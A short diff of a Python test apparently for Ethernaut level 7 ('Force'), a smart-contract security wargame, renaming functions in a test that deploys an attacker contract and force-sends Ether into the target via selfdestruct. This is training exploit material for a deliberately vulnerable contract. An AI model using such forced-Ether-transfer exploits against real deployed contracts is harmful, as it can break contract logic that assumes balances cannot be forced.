@@ -4,13 +4,13 @@ from pytypes.contracts.lv07_force import Force
 from pytypes.contracts.attacker.lv07_transfer import ForceTransfer, FasterForceTransfer
 
 @default_chain.connect()
-def test_level_07():
+def test_lv07():
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv07()
-    exploit_level_07(contract)
+    exploit_lv07(contract)
     ethernaut.check_lv07(contract)
 
-def exploit_level_07(contract: Force):
+def exploit_lv07(contract: Force):
     # Problem: Selfdestruct and minting transfer Ether directly 
     attacker1 = ForceTransfer.deploy()
     attacker1.push(contract, value=30)
